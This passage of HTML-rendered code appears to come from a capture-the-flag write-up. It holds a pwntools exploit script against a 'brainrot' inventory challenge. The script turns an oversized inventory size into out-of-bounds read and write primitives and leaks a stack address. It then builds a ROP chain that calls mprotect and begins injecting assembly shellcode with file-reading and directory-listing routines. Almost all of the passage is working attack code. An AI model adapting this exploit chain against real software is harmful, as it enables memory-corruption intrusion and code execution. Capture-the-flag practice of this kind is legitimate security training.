style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> steal</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Brainrot index:</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Which brainrot are you stealing?:</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> check</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Brainrot index: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> write64</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr</span><span style="color:#999999">,</span><span style="color:#393A34"> dest</span><span style="color:#999999">,</span><span style="color:#393A34"> src</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> addr </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">c00000c1e0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><br><span style="color:#393A34">    idx </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">c00000c1e0</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> //</span><span style="color:#2F798A"> 4</span><br><span style="color:#393A34">    target </span><span style="color:#999999">=</span><span style="color:#393A34"> dest </span><span style="color:#AB5959">-</span><span style="color:#393A34"> src</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> target </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 67676767</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 67676767</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">                print</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#999999">,</span><span style="color:#393A34"> idx</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                steal</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Los 67</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">                # io.interactive()</span><br><span style="color:#393A34">            target </span><span style="color:#999999">=</span><span style="color:#393A34"> target </span><span style="color:#AB5959">%</span><span style="color:#2F798A"> 67676767</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 1000000</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 1000000</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">                print</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#999999">,</span><span style="color:#393A34"> idx</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                steal</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Chimpanzini Bananini</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            target </span><span style="color:#999999">=</span><span style="color:#393A34"> target </span><span style="color:#AB5959">%</span><span style="color:#2F798A"> 1000000</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 100000</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 100000</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">                print</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#999999">,</span><span style="color:#393A34"> idx</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                steal</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Orcalero Orcala</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            target </span><span style="color:#999999">=</span><span style="color:#393A34"> target </span><span style="color:#AB5959">%</span><span style="color:#2F798A"> 100000</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 10000</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 10000</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">                print</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#999999">,</span><span style="color:#393A34"> idx</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                steal</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Odin Din Din Dun</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            target </span><span style="color:#999999">=</span><span style="color:#393A34"> target </span><span style="color:#AB5959">%</span><span style="color:#2F798A"> 10000</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 1000</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 1000</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">                print</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#999999">,</span><span style="color:#393A34"> idx</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                steal</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Job Job Job Sahur</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            target </span><span style="color:#999999">=</span><span style="color:#393A34"> target </span><span style="color:#AB5959">%</span><span style="color:#2F798A"> 1000</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 100</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 100</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">                print</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#999999">,</span><span style="color:#393A34"> idx</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                steal</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">John Pork</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            target </span><span style="color:#999999">=</span><span style="color:#393A34"> target </span><span style="color:#AB5959">%</span><span style="color:#2F798A"> 100</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">                print</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#999999">,</span><span style="color:#393A34"> idx</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                steal</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Ballerina Cappuccina</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            target </span><span style="color:#999999">=</span><span style="color:#393A34"> target </span><span style="color:#AB5959">%</span><span style="color:#2F798A"> 10</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">></span><span style="color:#AB5959">=</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">target </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">                print</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#999999">,</span><span style="color:#393A34"> idx</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                steal</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Meowl</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            target </span><span style="color:#999999">=</span><span style="color:#393A34"> target </span><span style="color:#AB5959">%</span><span style="color:#2F798A"> 1</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> read64</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> addr </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">c00000c1e0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><br><span style="color:#393A34">    idx </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">c00000c1e0</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> //</span><span style="color:#2F798A"> 4</span><br><span style="color:#393A34">    check</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">is generating $</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    low </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/s</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    check</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">is generating $</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    high </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/s</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    leak </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">high </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">low</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> leak</span><br><br><br><span style="color:#A0ADA0"># 0xc00140c1e0</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">How large is your inventory?</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">4000000000000000</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 1</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">check</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">leak1 </span><span style="color:#999999">=</span><span style="color:#393A34"> read64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">c000012070</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">6a8</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"leak1 => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">leak1</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># steal(0, b"Los 67")</span><br><span style="color:#A0ADA0"># pause()</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">leak1 </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">490</span><span style="color:#999999">,</span><span style="color:#393A34"> leak1 </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">6a8</span><span style="color:#999999">,</span><span style="color:#2F798A"> 8</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    tmp </span><span style="color:#999999">=</span><span style="color:#393A34"> read64</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"</span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">i</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">: tmp => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">tmp</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">tmp </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 36</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7ff</span><span style="color:#999999">:</span><br><span style="color:#393A34">        stack_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> tmp</span><br><span style="color:#1E754F">        break</span><br><br><span style="color:#A0ADA0"># ead64(leak1)</span><br><span style="color:#393A34">stack_addr </span><span style="color:#999999">+=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">a8</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"stack_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stack_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000647a5f</span><br><span style="color:#393A34">pop_rsi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000064a120</span><br><span style="color:#393A34">pop_rdx_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000662b1a</span><br><span style="color:#393A34">pop_rax_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000662865</span><br><span style="color:#393A34">syscall </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000661ba0</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">c003fffc00</span><br><span style="color:#393A34">pop_rax_rbx_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000064fcaa</span><br><span style="color:#998418">dir</span><span style="color:#999999"> =</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">c003fffc50</span><br><span style="color:#393A34">flag_name </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">c003fff12f</span><br><span style="color:#393A34">ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pop_rax_ret </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><br><span style="color:#393A34">push_rax_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000062db0c</span><br><br><span style="color:#393A34">reread </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#393A34">pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">50</span><span style="color:#999999">,</span><span style="color:#393A34"> ret</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">500</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#999999">,</span><span style="color:#393A34"> ret</span><span style="color:#999999">,</span><span style="color:#393A34"> ret</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">rop </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">fffffffffffff000</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1000</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 7</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">a0</span><span style="color:#2993a3">]</span><br><br><span style="color:#393A34">mini_shell </span><span style="color:#999999">=</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"""</span><br><span style="color:#B56959">entry:</span><br><span style="color:#B56959">    lea rsp,[rip - 0x7]</span><br><span style="color:#B56959">    mov rsp, </span><span style="color:#2993a3">{</span><span style="color:#393A34">stack_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">968</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">    call mini_shell</span><br><span style="color:#B56959">/* void gets(char*buffer) */</span><br><span style="color:#B56959">gets:</span><br><span style="color:#B56959">    push rbp</span><br><span style="color:#B56959">    mov rbp,rsp</span><br><br><span style="color:#B56959">    push rdi                    /*gets buffer*/</span><br><span style="color:#B56959">    push 0x0                    /*temp buff*/</span><br><span style="color:#B56959">readByte:</span><br><span style="color:#B56959">    xor rdi,rdi</span><br><span style="color:#B56959">    lea rsi,[rsp]               /*read one byte to buffer*/</span><br><span style="color:#B56959">    mov rdx,1</span><br><br><span style="color:#B56959">    xor rax,rax</span><br><span style="color:#B56959">    syscall</span><br><br><span style="color:#B56959">    cmp rax,1</span><br><span style="color:#B56959">    jne  error</span><br><br><span style="color:#B56959">    cmp byte ptr[rsp],0xa</span><br><span style="color:#B56959">    je getsend</span><br><span style="color:#B56959">    mov al,byte ptr[rsp]</span><br><br><span style="color:#B56959">    mov rdi,rsp</span><br><span style="color:#B56959">    add rdi,0x8</span><br><span style="color:#B56959">    mov rdi,[rdi]</span><br><br><span style="color:#B56959">    mov byte ptr [rdi], al</span><br><br><span style="color:#B56959">    inc rdi</span><br><span style="color:#B56959">    mov [rsp + 0x8],rdi         /*rdi++*/</span><br><span style="color:#B56959">    jmp readByte</span><br><br><span style="color:#B56959">getsend:</span><br><span style="color:#B56959">    mov rdi,[rsp + 0x8]</span><br><span style="color:#B56959">    mov byte ptr [rdi],0</span><br><span style="color:#B56959">error:</span><br><span style="color:#B56959">    leave</span><br><span style="color:#B56959">    ret</span><br><br><span style="color:#B56959">/* void print(char*string) */</span><br><span style="color:#B56959">print:</span><br><span style="color:#B56959">    push rbp</span><br><span style="color:#B56959">    mov rbp,rsp</span><br><span style="color:#B56959">    push rdi</span><br><br><span style="color:#B56959">    call strlen</span><br><span style="color:#B56959">    mov rdx,rax</span><br><span style="color:#B56959">    mov rdi,1</span><br><span style="color:#B56959">    mov rsi,[rsp]</span><br><br><span style="color:#B56959">    mov rax,1</span><br><span style="color:#B56959">    syscall</span><br><span style="color:#B56959">    leave</span><br><span style="color:#B56959">    ret</span><br><span style="color:#B56959">/* int strlen(const char*s) */</span><br><span style="color:#B56959">strlen:</span><br><span style="color:#B56959">    push rbx</span><br><span style="color:#B56959">    xor rax,rax</span><br><br><span style="color:#B56959">    test rdi,rdi</span><br><span style="color:#B56959">    je end</span><br><span style="color:#B56959">loop:</span><br><span style="color:#B56959">    mov bl,byte ptr [rdi]</span><br><span style="color:#B56959">    test bl,bl</span><br><span style="color:#B56959">    je end</span><br><span style="color:#B56959">    inc rax</span><br><span style="color:#B56959">    inc rdi</span><br><span style="color:#B56959">    jmp loop</span><br><span style="color:#B56959">end:</span><br><span style="color:#B56959">    pop rbx</span><br><span style="color:#B56959">    ret</span><br><br><span style="color:#B56959">/* void cat(const char*filepath)*/</span><br><span style="color:#B56959">cat:</span><br><span style="color:#B56959">    push r8</span><br><span style="color:#B56959">    push rbp</span><br><span style="color:#B56959">    mov rbp,rsp</span><br><br><span style="color:#B56959">    /* buffer */</span><br><span style="color:#B56959">    sub rsp,0x100</span><br><br><span style="color:#B56959">    /* open file */</span><br><span style="color:#B56959">    xor rcx,rcx</span><br><span style="color:#B56959">    mov rsi,rdi</span><br><span style="color:#B56959">    xor rdx,rdx</span><br><span style="color:#B56959">    mov edi,0xFFFFFF9C</span><br><span style="color:#B56959">    call sys_openat2</span><br><br><span style="color:#B56959">    cmp rax,-1</span><br><span style="color:#B56959">    je open_failed</span><br><span style="color:#B56959">    mov r8,rax</span><br><span style="color:#B56959">/* loop of read*/</span><br><span style="color:#B56959">loop_read:</span><br><span style="color:#B56959">    mov rdi,r8</span><br><span style="color:#B56959">    mov rsi,rsp</span><br><span style="color:#B56959">    mov rdx,0x100</span><br><br><span style="color:#B56959">    xor rax,rax</span><br><span style="color:#B56959">    syscall</span><br><br><span style="color:#B56959">    cmp rax,0</span><br><span style="color:#B56959">    /* read eof or failed*/</span><br><span style="color:#B56959">    jle open_failed</span><br><br><span style="color:#B56959">    mov rdi,1</span><br><span style="color:#B56959">    mov rsi,rsp</span><br><span style="color:#B56959">    mov rdx,rax</span><br><br><span style="color:#B56959">    mov rax,1</span><br><span style="color:#B56959">    syscall</span><br><br><span style="color:#B56959">    jmp loop_read</span><br><span style="color:#B56959">open_failed:</span><br><span style="color:#B56959">    leave</span><br><span style="color:#B56959">    pop r8</span><br><span style="color:#B56959">    ret</span><br><br><span style="color:#B56959">/* void ls(const char*dir) */</span><br><span style="color:#B56959">ls:</span><br><span style="color:#B56959">    push r8</span><br><span style="color:#B56959">    push rbp</span><br><span style="color:#B56959">    mov rbp,rsp</span><br><span style="color:#B56959">    /* buffer */</span><br><span 